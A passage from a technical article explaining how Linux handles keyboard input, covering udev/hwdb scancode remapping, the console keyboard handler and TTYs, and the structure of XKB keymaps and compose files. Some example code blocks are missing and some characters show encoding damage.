    &lt;p&gt;You can also do the runtime patching of scancode to keycode mapping through udev and hwdb by setting a device property in &lt;code&gt;ENV{KEYBOARD_KEY_&amp;lt;hex scan code&amp;gt;}=&amp;lt;key code identifier&amp;gt;&lt;/code&gt; which will in
turn be caught by &lt;code&gt;systemd/src/udev/udev-builtin-keyboard.c&lt;/code&gt; and also
call the same ioctl interfaces.&lt;/p&gt;
    &lt;p&gt;For example:&lt;/p&gt;
    &lt;code&gt;ENV{KEYBOARD_KEY_b4}=dollar
&lt;/code&gt;
    &lt;p&gt;To find out the actual scancodes the device is generating the &lt;code&gt;showkey(1)&lt;/code&gt;
tool from the Linux Keyboard tools project, with the &lt;code&gt;--scancodes&lt;/code&gt; flag,
will attach to the console handler and display them in raw mode. And the
&lt;code&gt;setkeycodes(8)&lt;/code&gt; command from the same project will propagate it to the
driver via the console input handler.&lt;/p&gt;
    &lt;p&gt;There are multiple other tools used to do the keycode remapping such as &lt;code&gt;evmapd&lt;/code&gt;, &lt;code&gt;evremap&lt;/code&gt;, &lt;code&gt;evdevremapkeys&lt;/code&gt;, but these work at the evdev
layer and donât know about scancodes. So for now, the simplest one to
do scancode to keycode mapping is obviously the built-in one: hwdb.&lt;/p&gt;
    &lt;p&gt;This mechanism for runtime modifications might save us time instead of getting our hands dirty and having to modify kernel drivers.&lt;/p&gt;
    &lt;head rend="h2"&gt;Console Keyboard&lt;/head&gt;
    &lt;p&gt;Weâve discussed the &lt;code&gt;evdev&lt;/code&gt; handler extensively, however in the console
itâs the &lt;code&gt;kbd&lt;/code&gt; input event handler (&lt;code&gt;drivers/tty/vt/keyboard.c&lt;/code&gt;) that is
used, and itâs working in sync with the tty and line discipline mechanism.&lt;lb/&gt; This particular handler exposes its devices as TTYs in the infamous &lt;code&gt;/dev/ttyN&lt;/code&gt; and &lt;code&gt;/dev/console&lt;/code&gt; (system) and handles all the messiness
of console text-mode input.&lt;/p&gt;
    &lt;p&gt;The input handlers coexist. When switching from graphical environment to console, the VT &lt;code&gt;kbd&lt;/code&gt; handler takes over.&lt;/p&gt;
    &lt;p&gt;Obviously, as a console input handler, the &lt;code&gt;kbd&lt;/code&gt; handler has much more
work to do, and it has a lot of special handling via ioctl too. From
bell and tone, leds, setting console key rate, modifiers, interpreting
special keys that have meanings for the TTY, switching to other modes
such as raw input mode or graphic (X11, Wayland session), all the push
towards line discipline, etc.. Itâs handling things that are often
handled in user-space (key rate is handled in the graphical stack too
as weâll see). The reason: historical entangling, the console existed
before the graphical stack.&lt;/p&gt;
    &lt;p&gt;For instance, &lt;code&gt;showkey(1)&lt;/code&gt; which weâve just seen, relies on changing the
mode of the terminal via ioctl &lt;code&gt;KDSKBMODE&lt;/code&gt; to &lt;code&gt;K_RAW&lt;/code&gt;.&lt;lb/&gt; There are a bunch of commands to interface with the ioctl such as &lt;code&gt;kbdrate(8)&lt;/code&gt; to set the keyboard rate, &lt;code&gt;kbdinfo(1)&lt;/code&gt; to get more info
about the kbd driver, and &lt;code&gt;kbd_mode(1)&lt;/code&gt; to get the current keyboard mode
(raw, xlate, etc..)&lt;/p&gt;
    &lt;code&gt;[Keyboard hardware]
   â
[input driver: atkbd, hid-input]
   â
[input core]
   â
[keyboard.c handler (kbd_event)]
   â
[TTY layer (virtual console, ttyN)]
   â
[N_TTY line discipline]
   â
[read() by shell, echo, canonical editing, etc.]
&lt;/code&gt;
    &lt;p&gt;Furthermore, since itâs taking a bigger role on handling scancode to keycode, it also somewhat does keycode interpretation via its internal keymap. That means, the &lt;code&gt;kbd&lt;/code&gt; handler can be responsible of handling the
difference in regional keyboard layouts and special keys. This is
something which usually happens in XKB, in user-space, which weâll see
in the next section.&lt;/p&gt;
    &lt;p&gt;Thus it has two sets of ioctl: &lt;code&gt;KDSETKEYCODE&lt;/code&gt; and &lt;code&gt;KDGETKEYCODE&lt;/code&gt; for
low-level scancodes to keycodes, and &lt;code&gt;KDGKBENT&lt;/code&gt; and &lt;code&gt;KDSKBENT&lt;/code&gt; for the
keycode to symbol/action mapping (internally also confusingly called
&lt;code&gt;key_maps&lt;/code&gt;, as youâll see everyone uses the word âkeymapâ).&lt;/p&gt;
    &lt;p&gt;The format of the keymaps translating keycode to symbol (&lt;code&gt;keymaps(5)&lt;/code&gt;)
is managed by the kernel for each console, but usually more
easily set with user-space tools also from the Linux keyboard
tools project. For example &lt;code&gt;loadkeys(1)&lt;/code&gt; and
&lt;code&gt;dumpkeys(1)&lt;/code&gt;. These can rely on files in &lt;code&gt;/usr/share/kbd/keymaps/&lt;/code&gt;
for a predefined set of keymaps. Letâs also mention that the default
one is found in &lt;code&gt;/usr/src/linux/drivers/tty/vt/defkeymap.map&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Before we end, letâs mention &lt;code&gt;systemd-localed.service(8)&lt;/code&gt; and its
&lt;code&gt;localectl(1)&lt;/code&gt; command. It is used to set the keyboard map for
both the console and the graphical environment (XKB in X11 as weâll see)
based on the current locale. For example, it sets the keymap,
font, and others, of the console and X11 XKB to the value found in
&lt;code&gt;/etc/vconsole.conf&lt;/code&gt; (see &lt;code&gt;vconsole.conf(5)&lt;/code&gt;) through its service called
&lt;code&gt;systemd-vconsole-setup(8)&lt;/code&gt;, which is also called when the console is
initialized with udev. It can also help in setting the same values in
both the console and graphical stack.&lt;/p&gt;
    &lt;p&gt;Hereâs &lt;code&gt;vconsole.conf&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;&amp;gt; localectl
System Locale: LANG=en_US.UTF-8
    VC Keymap: us
   X11 Layout: us
&lt;/code&gt;
    &lt;p&gt;NB: Terminal emulators donât rely on the console input handler at all, they use pseudo-terminals instead (PTYs). These donât have VGA console, nor plug to the kbd handler, nor screen, etc.. They are fed entirely by user-space programs.&lt;lb/&gt; Example:&lt;/p&gt;
    &lt;code&gt;Line discipline &amp;lt;-&amp;gt; TTY driver (PTY slave side) &amp;lt;-&amp;gt; user process
 `-&amp;gt; PTY master side &amp;lt;-&amp;gt; xterm process
&lt;/code&gt;
    &lt;p&gt;See this old article for more details on that.&lt;/p&gt;
    &lt;code&gt;&amp;gt; cat /proc/consoles
tty0                 -WU (EC  p  )    4:2

&amp;gt; cat /proc/tty/drivers

/proc/tty/drivers
/dev/tty             /dev/tty        5       0 system:/dev/tty
/dev/console         /dev/console    5       1 system:console
/dev/ptmx            /dev/ptmx       5       2 system
/dev/vc/0            /dev/vc/0       4       0 system:vtmaster
serial               /dev/ttyS       4 64-95 serial
pty_slave            /dev/pts      136 0-1048575 pty:slave
pty_master           /dev/ptm      128 0-1048575 pty:master
unknown              /dev/tty        4 1-63 console
&lt;/code&gt;
    &lt;p&gt;Now letâs see how the keycode to keysym is done in user-space in the graphical stack with XKB.&lt;/p&gt;
    &lt;head rend="h2"&gt;XKB&lt;/head&gt;
    &lt;p&gt;XKB, or X keyboard, is a common library (xkbcommon, xkbregistry, xkbcompose) with a set of tools, an X11 protocol extension (X Keyboard Extension), and a database collection of descriptions (xkeyboard-config). Its role is to handle the keycode to keysym translation in user-space.&lt;lb/&gt; While the name includes âXâ, the common library and database are not only used by Xorg but by most software, including graphical widgets such as GTK and Qt, and Wayland compositors. We wonât cover the older X protocol extension here, yet the reason why thereâs an âXâ in the name is that it started as an extension and then got separated into a common library.&lt;/p&gt;
    &lt;p&gt;The two things weâll focus on are xkbcommon, the xkb core engine that parse and executes XKB definitions, and the xkeyboard-config, which is a project compiling a database of keyboard info, layouts, variants, symbols, and rules. They work together.&lt;/p&gt;
    &lt;p&gt;As a word of notice, XKB is one of the most complex piece of software Iâve encountered and its documentation is fiercely lacking and dispersed. It has its own language, compiler, and the format is extremely convoluted and inconsistent, often mixing camel case and snake case for no apparent reasons.&lt;lb/&gt; Even in the XKB documentation we find such comments:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;Todo&lt;/p&gt;&lt;lb/&gt;Explain how to configure XKB, with examples&lt;/quote&gt;
    &lt;quote&gt;
      &lt;p&gt;Due to the complexity of the format, this document is still is construction.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;And internally Xorg devs called it âX Kitten Butcherâ.&lt;/p&gt;
    &lt;p&gt;Weâll try to make it approachable, and break the bad spell. However, if you ever want more info check the official format.&lt;/p&gt;
    &lt;p&gt;In order to perform the translation from keycodes coming from event handlers to actual symbols, XKB relies on something called an XKB keymap (yes everything is called a keymap). This XKB keymap is a compilation of different components coming from the xkeyboard-config database that are chosen based on the abstract, and more coherent, concept of layout, variants, models, and options the user pick: âRMLVOâ.&lt;/p&gt;
    &lt;p&gt;After this is picked, the XKB client software just has to keep track of whatâs called a state, and then send it along with the received keycode to receive back the keysym.&lt;lb/&gt; A very basic example looks like this:&lt;/p&gt;
    &lt;p&gt;The XKB state object tracks what affects the output of keycode to keysym, things like modifiers and groups. This example doesnât mention the idea of key composing, but weâll come back to it.&lt;/p&gt;
    &lt;p&gt;This is important to understand, since you can either have XKB handle what happens in a specific state when a key is pressed, or do it from the client side. For example, a client can choose to catch all Ctrl keys and interpret Ctrl+h as backspace, or leave it up to XKB with a custom mechanism to know what Ctrl+h means, and the client will receive back the keysym for backspace directly, with no special handling from its side.&lt;lb/&gt; Yet, the downside is that this key combination will apply to everyone that relies on this XKB keymap.&lt;/p&gt;
    &lt;p&gt;Before moving forward, we need a little baggage of definitions, and understanding, otherwise nothing will make sense.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;evdev keycodes: the events coming from evdev, the ones listed in &lt;code&gt;/usr/include/linux/input-event-codes.h&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;XKB keysyms: Actual symbols (or dead key), actions, and special keys that XKB will return, they exist in &lt;code&gt;/usr/include/xkbcommon/xkbcommon-keysyms.h&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Modifier Keys: Special keys that can affect other keys such as shift, alt, ctrl, âwinâ, etc.. Modifiers are also keysyms.&lt;/item&gt;
      &lt;item&gt;Geometry: The physical layout of a keyboard, what it looks like and where the keys are&lt;/item&gt;
      &lt;item&gt;Levels and Groups: Levels is another state a key could be in when you press a modifier. For example, itâs expected that pressing shift with âaâ will output âAâ, upper case âAâ is the level 2 of what happens when pressing the key. A Group is similar but it completely switches the whole keyboard to another key mapping, as if you switched variants.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;As you can imagine, thereâs a lot at play with levels, groups, modifiers, and actions that can happen, and thatâs apart from the basic idea of keycodes to keysym.&lt;/p&gt;
    &lt;p&gt;Even when it comes to keysym, the translation isnât straight away. XKB relies on intermediary objects.&lt;lb/&gt; XKB keycodes are not straight up evdev keycodes, but &lt;code&gt;evdev keycodes + 8&lt;/code&gt;. Why 8, someone might ask. Well, the only answer
is backward compatibility from before evdev was a thing, and itâs
still there.&lt;/p&gt;
    &lt;p&gt;Furthermore, XKB converts these keycodes into physical key positions values that are compatible with ISO/IEC 9995-1. So we move from evdev keycodes, to XKB keycodes, to physical abstract position on a keyboard layout. This is what happens in the keycode component files under &lt;code&gt;/usr/share/xkeyboard-config-2/keycodes/&lt;/code&gt;. Keycodes
have this form within &lt;code&gt;&amp;lt;...&amp;gt;&lt;/code&gt; tags. For example:&lt;/p&gt;
    &lt;code&gt;&amp;lt;TLDE&amp;gt; = 49;
&amp;lt;AE01&amp;gt; = 10;
&amp;lt;AE02&amp;gt; = 11;
&amp;lt;AE03&amp;gt; = 12;
&amp;lt;AE04&amp;gt; = 13;
&amp;lt;AE05&amp;gt; = 14;
&amp;lt;AE06&amp;gt; = 15;
&amp;lt;AE07&amp;gt; = 16;
&amp;lt;AE08&amp;gt; = 17;
&amp;lt;AE09&amp;gt; = 18;
&amp;lt;AE10&amp;gt; = 19;
&amp;lt;AE11&amp;gt; = 20;
&amp;lt;AE12&amp;gt; = 21;
&amp;lt;BKSP&amp;gt; = 22;
&lt;/code&gt;
    &lt;p&gt;Remember â49â, â10â, â11â are equivalent to evdev:&lt;/p&gt;
    &lt;code&gt;#define KEY_GRAVE		41
#define KEY_1			2
#define KEY_2			3
#define KEY_3			4
#define KEY_4			5
#define KEY_5			6
#define KEY_6			7
#define KEY_7			8
#define KEY_8			9
#define KEY_9			10
#define KEY_0			11
#define KEY_MINUS		12
#define KEY_EQUAL		13
#define KEY_BACKSPACE		14
&lt;/code&gt;
    &lt;p&gt;Or basically the first row from ISO/IEC 9995-1 on a keyboard.&lt;/p&gt;
    &lt;p&gt;To make it easier for users to pick an XKB keymap, without having to know much details, the idea of picking only RMLVO, Rules-Model-Layout-Variant-Options, was invented. This is an abstraction on top to pick the components that make up a keymap, and thus come up with the right keyboard behavior expected by the user. This is managed by the XKB registry, which graphical environments interact with, this is what is shown to the user when theyâre asked about picking their keyboard layout, the list of possible layouts and variants on those layouts, along with special options.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Model â the name of the model of your keyboard&lt;/item&gt;
      &lt;item&gt;Layout â the layout(s) you intend to use (usually refer to country code)&lt;/item&gt;
      &lt;item&gt;Variant â the variant(s) of the layout(s) you intend to use (minor and national variants)&lt;/item&gt;
      &lt;item&gt;Options â extra XKB configuration options to customize the standard layout. For example to change modifier keys.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;To know whatâs actually picked as the final keymap, whatâs called KcCGST, we can run &lt;code&gt;xkbcli&lt;/code&gt;. For example, for a dvorak keyboard, or a normal
qwerty keyboard:&lt;/p&gt;
    &lt;p&gt;Weâll revisit the RMLVO, letâs just say itâs all about what the âruleâ part refers to: a lookup table with rules mapping the abstract names to the components of the keymaps which are called KcCGST.&lt;/p&gt;
    &lt;p&gt;To find your layout and visualize it you can check the gallery here and the analyzer here.&lt;/p&gt;
    &lt;p&gt;KcCGST, or the Keycodes, Compat, Geometry, Symbols, Types, are the component parts of an XKB keymap. This is the actual functional XKB configuration that is used behind the RMLVO easy facade. In general, XKB considers it an implementation detail and pushes for users to favor configuring XKB through RMLVO. Yet, itâs the core of XKB!&lt;/p&gt;
    &lt;p&gt;The resolution of the RMLVO will create a complete keymap, a self-contain object that has all the related KcCGST components assembled together. This complete XKB keymap is what is used by the clients.&lt;/p&gt;
    &lt;p&gt;To get a quick glimpse at what a full resolved keymap looks like, try this command:&lt;/p&gt;
    &lt;code&gt;&amp;gt; xkbcli compile-keymap --layout us --rules evdev
&lt;/code&gt;
    &lt;p&gt;Or for a more compact one, look again at the command such as the one we just did before:&lt;/p&gt;
    &lt;p&gt;Letâs go over these components and explain them.&lt;/p&gt;
    &lt;p&gt;First of, the KcCGST configurations that come from the keyboard-config project are often found in the following places in reverse order of precedence, with the component bundled underneath:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;/usr/share/X11/xkb&lt;/code&gt;,&lt;code&gt;$XKB_CONFIG_ROOT&lt;/code&gt;,&lt;code&gt;/usr/share/xkeyboard-config-2/&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;/etc/xkb&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;$XKB_CONFIG_EXTRA_PATH&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;$HOME/.xkb&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;$HOME/.config/xkb&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Most of the components have a useful utility. Thatâs apart from the geometry, which is a complex file used to describe what a keyboard physical layout looks like. Itâs not used in the latest xkbcommon mechanism though, so weâll skip explaining it.&lt;/p&gt;
    &lt;p&gt;The XKB configuration format has types: string, numbers, key positions, and keysym:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;"hello"&lt;/code&gt;,&lt;code&gt;"%S/pc"&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;42&lt;/code&gt;,&lt;code&gt;134&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;&amp;lt;AE12&amp;gt;&lt;/code&gt;,&lt;code&gt;&amp;lt;BKSP&amp;gt;&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;percent&lt;/code&gt;,&lt;code&gt;a&lt;/code&gt;,&lt;code&gt;A&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;It also has many special keywords, and some structure format. The main structural format is called a component, basically the components of the KcCGST. Each XKB conf file is an aggregation of multiple of these components. They have the form:&lt;/p&gt;
    &lt;p&gt;The generic flags can be one or many of these:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;default&lt;/code&gt;: One of these âvariantâ per component file, the default values to be used&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;partial&lt;/code&gt;: To be used in another conf&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;hidden&lt;/code&gt;: Only used internally within the fileâs scope&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;And the symbols flags can be one or many of these:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;code&gt;alphanumeric_keys&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;modifier_keys&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;keypad_keys&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;function_keys&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;alternate_group&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The symbols flags are mostly metadata and donât affect the XKB processing. Theyâre indicators of what the component configuration covers, and if none are present itâs assumed it covers a complete keyboard.&lt;/p&gt;
    &lt;p&gt;Letâs start with the most important keywords, the ones used to import and merge files together, weâve seen the &lt;code&gt;include&lt;/code&gt;. It works by finding
the file of the same component with the specified name, if it exists
in any of the valid conf paths (or if explicitly mentioned with string
substitution shorthands), and then look for the variants inside or the
default value if none are passed: &lt;code&gt;include "file(variant)"&lt;/code&gt;.&lt;lb/&gt; The &lt;code&gt;include&lt;/code&gt; will override any information that already exists:
that is if new values are undefined it will keep the old one, but new
defined values will always override old ones. To avoid this, the &lt;code&gt;augment
"file(variant)"&lt;/code&gt; should be used instead, it will update the properties
that are undefined, but keep the defined ones (itâs the reverse). Another
option is the &lt;code&gt;replace "file(variant)"&lt;/code&gt; which will, as the name implies,
completely replace the full properties, regardless if some elements are
defined or not.&lt;/p&gt;
    &lt;p&gt;This âmerge resolutionâ mechanism also applies to values within the components objects, which can be tagged with &lt;code&gt;augment&lt;/code&gt;, &lt;code&gt;override&lt;/code&gt;,
&lt;code&gt;replace&lt;/code&gt;, too.&lt;/p&gt;
    &lt;p&gt;As for files, a shorthand exists to have a single statement with multiple includes concatenated. In this case the following merge mode prefixes are used:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;+&lt;/code&gt;selects the override merge mode (default).&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;|&lt;/code&gt;selects the augment merge mode.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;^&lt;/code&gt;selects the replace merge mode.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;So you can now understand why the following line weâve seen works, and how it creates an inheritance mechanism, plugging multiple files together:&lt;/p&gt;
    &lt;p&gt;Letâs now explain what each component does, and wrap up with how the rules mechanism of the RMLVO then resolves them into an XKB full keymap.&lt;/p&gt;
    &lt;p&gt;The keycodes file is the most obvious one and the first entry-point for XKB logic, it translates from XKB keycodes to the physical codes ISO/IEC 9995-1. The syntax of the components looks something like this:&lt;/p&gt;
    &lt;p&gt;The syntax is straight forward, itâs a couple of assignment, with the possibility to have aliases, and giving names to LEDs, indicators, which arenât really leds afaik but keys that lock or latch. By convention it explicitly names special keys, but other keys as their ISO positions.&lt;/p&gt;
    &lt;p&gt;Hereâs a standard keyboard with its key positions:&lt;/p&gt;
    &lt;p&gt;Courtesy from https://www.charvolant.org/doug/xkb/html/img3.png&lt;/p&gt;
    &lt;p&gt;Letâs move to the types component. This is where the information about levels, and how to switch between them is defined.&lt;/p&gt;
    &lt;p&gt;The syntax here is more cumbersome. Firstly, there are some definition lines. In each &lt;code&gt;type&lt;/code&gt; entry (which can be prepended with merge syntax
like anything else in this syntax really) of the form &lt;code&gt;type "name"&lt;/code&gt;,
we have to define the modifiers that will be used as such:&lt;/p&gt;
    &lt;p&gt;The &lt;code&gt;+&lt;/code&gt;, is just a separator here.&lt;lb/&gt; If the modifiers are not real keysym but virtual ones, then those virtual modifiers also need to be defined earlier in the scope:&lt;/p&gt;
    &lt;p&gt;After defining the modifiers that are used for that type, we have a series of mapping to define the combination and what levels these will achieve.&lt;/p&gt;
    &lt;p&gt;The syntax is also straight forward, itâs a list of mapping from a combination of modifiers to the &lt;code&gt;LevelX&lt;/code&gt; it will take the keysym to.&lt;/p&gt;
    &lt;p&gt;Afterward, we have a naming section, which is there only for the metadata information, to give names to levels:&lt;/p&gt;
    &lt;p&gt;The only tricky part is the &lt;code&gt;preserve&lt;/code&gt; keyword:&lt;/p&gt;
    &lt;p&gt;This has to do with how XKB consumes modifiers as it processes types and outputs keysyms, its internal list of effective modifiers. Simply said, without the &lt;code&gt;preserve&lt;/code&gt; when the keysym is sent back to the client
(&lt;code&gt;xkb_state_key_get_one_sym&lt;/code&gt;) the state object doesnât consume the
modifier, so the client can inspect it for further special handling.&lt;lb/&gt; The logic within XKB clients looks something like this:&lt;/p&gt;
    &lt;p&gt;Thatâs useful for layout where you have, letâs say Greek letters for Level1 and Level2, and at Level3 and Level4 there are the usual Latin letters. So youâd want to preserve &lt;code&gt;Ctrl&lt;/code&gt; and &lt;code&gt;Shift&lt;/code&gt;, so that the
application can catch &lt;code&gt;Ctrl+c&lt;/code&gt; for example, which would be in Level3
(Latin lower-case).&lt;/p&gt;
    &lt;p&gt;Iâve added different versions of the &lt;code&gt;ALPHABETIC&lt;/code&gt; type in the example,
and how the capslock and shift combinations can affect letters.&lt;/p&gt;
    &lt;p&gt;Later on weâll see how we assign the levels logic to symbols and compatibility logic, but letâs just say that XKB will categorize keys with a heuristic and assign them to default types if no other types were explicitly chosen. These are:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;"ONE_LEVEL"&lt;/code&gt;: When there are only one level change for the keysym&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;"TWO_LEVEL"&lt;/code&gt;: When there are exacly two levels change for the keysym&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;"ALPHABETIC"&lt;/code&gt;: When the keysym is alphabetic and has two levels&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;"KEYPAD"&lt;/code&gt;: For keypad keys of any level (two usually)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;"FOUR_LEVEL_ALPHABETIC"&lt;/code&gt;,&lt;code&gt;"FOUR_LEVEL_SEMIALPHABETIC"&lt;/code&gt;, 3 to 4 keysym&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;"FOUR_LEVEL"&lt;/code&gt;: When nothing else matches&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The next component is the XKB compatibility, which is used to translate key combinations into action statements. Actions can also be attached directly in the XKB symbols component for each key, however itâs done in the compatibility layer because it has a mechanism for generic pattern matching of keysym combinations, so we donât have to repeat the same things in different places.&lt;lb/&gt; The actions that can be done in the XKB compatibility are varied from latching/unlatching/locking/unlocking modifiers, changing level, switching group, etc.. Many of these actions, however, only make sense in combination with the XKB symbols component, so keep that in mind for now.&lt;lb/&gt; A compatibility map looks something like:&lt;/p&gt;
    &lt;p&gt;This has many components, the &lt;code&gt;interpret&lt;/code&gt; sections to map keys to actions,
the virtual modifier definitions, indicators, repeat behavior of keys,
and more. The important part is the &lt;code&gt;interpret&lt;/code&gt; section which matches
keysym along with a modifier (&lt;code&gt;AnyOfOrNone&lt;/code&gt;, &lt;code&gt;AnyOf&lt;/code&gt;, &lt;code&gt;Any&lt;/code&gt;, &lt;code&gt;NoneOf&lt;/code&gt;,
&lt;code&gt;AllOf&lt;/code&gt;, &lt;code&gt;Exactly&lt;/code&gt;). The body of the interpret can also be more specific
by setting values of &lt;code&gt;useModMapMods&lt;/code&gt; to match a certain level.&lt;lb/&gt; Default values to params can be set globally such as &lt;code&gt;setMods.clearLocks&lt;/code&gt;,
which affects how &lt;code&gt;SetMods&lt;/code&gt; and other mods actions behave.&lt;lb/&gt; The list of possibilities and actions within the compatibility is too long to explain here, the list is extensive and can be found here.&lt;/p&gt;
    &lt;p&gt;Letâs move to the keysym or symbol component, which as you would have guessed, finally maps physical keys in ISO location format to symbols. These files are often named after countries or languages or specific features, &lt;code&gt;us&lt;/code&gt;, &lt;code&gt;jp&lt;/code&gt;, &lt;code&gt;group&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;It first has a metadata name in the &lt;code&gt;name[GroupX] = "Symbols Name"&lt;/code&gt;
property, which can also be used to find which groups the symbols
belong to.&lt;lb/&gt; This is also where virtual modifiers are mapped to actual keys with the &lt;code&gt;modifier_map VIRTUAL_MOD { Symbol1, Symbol2}&lt;/code&gt;.&lt;lb/&gt; And obviously, thatâs where the &lt;code&gt;key &amp;lt;VAL&amp;gt;&lt;/code&gt; are mapped to list of groups
within &lt;code&gt;{}&lt;/code&gt;, and levels within &lt;code&gt;[]&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;This means the physical key &lt;code&gt;&amp;lt;TLDE&amp;gt;&lt;/code&gt;, in level1 will output a left quote
(backtick), and in level2 will output the tilde character.&lt;/p&gt;
    &lt;p&gt;Additionally, we can also specify within the curly brackets whether a specific type should be used instead of the default matching one:&lt;/p&gt;
    &lt;p&gt;Similarly, the actions can be assigned here instead of in the compatibility component, and the groups can also be explicitly expressed with the syntax:&lt;/p&gt;
    &lt;p&gt;That all should cover the KcCGST component syntax. Itâs very long already, I know, yet it barely covers the basics. Letâs see a few examples to grasp the concepts.&lt;/p&gt;
    &lt;p&gt;In &lt;code&gt;symbol/group&lt;/code&gt; we have:&lt;/p&gt;
    &lt;p&gt;And in &lt;code&gt;compat/basic&lt;/code&gt; we have these &lt;code&gt;interpret&lt;/code&gt;:&lt;/p&gt;
    &lt;p&gt;The &lt;code&gt;Multi_key&lt;/code&gt; maps to a compose key in &lt;code&gt;compat/ledcompose&lt;/code&gt;:&lt;/p&gt;
    &lt;p&gt;Weâll see in a bit how compose works.&lt;/p&gt;
    &lt;p&gt;Another example setting &lt;code&gt;&amp;lt;LWIN&amp;gt;&lt;/code&gt; to &lt;code&gt;Super_L&lt;/code&gt; which sets &lt;code&gt;Mod3&lt;/code&gt; modifier.&lt;/p&gt;
    &lt;p&gt;Hereâs another example swapping the top row numbers on shift:&lt;/p&gt;
    &lt;p&gt;Hereâs a symbol component which replaces key âBâ to have a third level activated with the right alt to display a broccoli.&lt;/p&gt;
    &lt;p&gt;NB: XKB has keysym to allow controlling the mouse pointer from the keyboard, this can be useful if clients actually understand these keysym and act on them.&lt;/p&gt;
    &lt;p&gt;Itâs fine and all but we need the RMLVO so that the users can actually use the keymap properly without bothering with all that weâve seen.&lt;lb/&gt; The rules are in the &lt;code&gt;rules&lt;/code&gt; directory as simple files without extensions,
and are accompanied with two listing files for GUI selectors: &lt;code&gt;*.lst&lt;/code&gt;
and &lt;code&gt;*.xml&lt;/code&gt; that follow the &lt;code&gt;xkb.dtd&lt;/code&gt; in the same directory. The listing
files are simply listing all the models, variants, layouts, and options
available, nothing more, and are used by the XKB registry library. Thatâs
in turn used by GUI selectors.&lt;/p&gt;
    &lt;p&gt;The logic exists within the rules files, that have this sort syntax:&lt;/p&gt;
    &lt;p&gt;The full syntax grammar looks like this:&lt;/p&gt;
    &lt;p&gt;We wonât go into details, but basically it has lines starting with &lt;code&gt;!&lt;/code&gt;
that set certain MLVO values and then map them to KccgstValue specific
component values. There are also variable names that can be defined
as shorthand for multiple values with &lt;code&gt;$var = val1 val2&lt;/code&gt;, and there
are string substitutions starting with &lt;code&gt;%&lt;/code&gt;. More info can be found
here.&lt;/p&gt;
    &lt;p&gt;So weâve got the full scope now of RMLVO to KcCGST, the big picture!&lt;/p&gt;
    &lt;p&gt;We didnât discuss another sub-feature of XKB called composing, or the compose key processor. We didnât mention it because the configuration doesnât come with the xkeyboard-config project. Itâs loaded independently by clients that want to perform composition.&lt;lb/&gt; For X11 the configuration is found under &lt;code&gt;/usr/share/X11/local/*/Compose&lt;/code&gt;
and &lt;code&gt;compose.dir&lt;/code&gt;, and the home directory in &lt;code&gt;~/.XCompose&lt;/code&gt;. The
content of this directory is mostly deprecated apart from the compose
definitions, which follows the &lt;code&gt;XKB_COMPOSE_FORMAT_TEXT_V1&lt;/code&gt; format (see
&lt;code&gt;Compose(5)&lt;/code&gt;). Itâs a simple format that looks like this:&lt;/p&gt;
    &lt;code&gt;&amp;lt;Multi_key&amp;gt; &amp;lt;e&amp;gt; &amp;lt;'&amp;gt;       : "Ã©"   U00E9
&amp;lt;Multi_key&amp;gt; &amp;lt;'&amp;gt; &amp;lt;e&amp;gt;       : "Ã©"   U00E9
&amp;lt;Multi_key&amp;gt; &amp;lt;o&amp;gt; &amp;lt;slash&amp;gt;   : "Ã¸"   U00F8
&amp;lt;Multi_key&amp;gt; &amp;lt;s&amp;gt; &amp;lt;s&amp;gt;       : "Ã"   U00DF
&lt;/code&gt;
    &lt;p&gt;As you can see, this is the &lt;code&gt;&amp;lt;Multi_key&amp;gt;&lt;/code&gt; keysym weâve talked about in
an earlier example, this is where itâs interpreted.&lt;/p&gt;
